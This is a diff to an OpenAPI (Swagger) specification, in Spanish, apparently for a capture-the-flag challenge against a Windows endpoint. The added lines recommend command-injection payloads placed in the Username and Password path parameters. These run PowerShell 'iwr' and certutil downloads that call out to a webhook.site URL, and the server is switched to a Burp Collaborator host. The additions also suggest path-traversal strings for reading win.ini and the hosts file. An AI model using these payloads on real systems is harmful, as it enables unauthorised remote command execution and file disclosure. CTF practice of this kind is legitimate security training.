@@ -2,26 +2,44 @@ openapi: "3.0.0"
 info:
   title: "CTF Windows Swagger Exploit"
   version: "1.0.0"
-  description: "Explotación Path Traversal / Command Injection en Windows"
+  description: |
+    Endpoint vulnerable a path traversal y/o command injection.
+    Ejemplo de webhook para detección de ejecución remota:  
+    https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003
 servers:
-  - url: "https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003"
+  - url: "http://kbzsipjangphidl11k2l67d81z7qvf.burpcollaborator.net"
 paths:
   '/{Username}/{Password}':
     post:
       summary: "Explotar endpoint vulnerable"
+      description: |
+        Prueba payloads en Username y Password, por ejemplo para ejecutar comandos en el servidor que hagan una petición a tu webhook.
+        Payloads recomendados para Windows:
+          - & powershell -c "iwr https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003" &
+          - | powershell -c "iwr https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003" |
+          - & certutil -urlcache -split -f https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003 temp.txt &
+        Para path traversal prueba rutas como:
+          - ..\..\..\..\..\..\Windows\win.ini
+          - ..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
       parameters:
         - name: Username
           in: path
           required: true
           schema:
             type: string
-          description: "Payload para prueba de traversal/injection"
+          description: |
+            Payload para prueba de traversal/injection.
+            Ejemplo de command injection con webhook:
+              & powershell -c "iwr https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003" &
         - name: Password
           in: path
           required: true
           schema:
             type: string
-          description: "Payload para prueba de traversal/injection"
+          description: |
+            Payload para prueba de traversal/injection.
+            Ejemplo de command injection con webhook:
+              & certutil -urlcache -split -f https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003 temp.txt &
       responses:
         '200':
           description: "Respuesta del servidor"
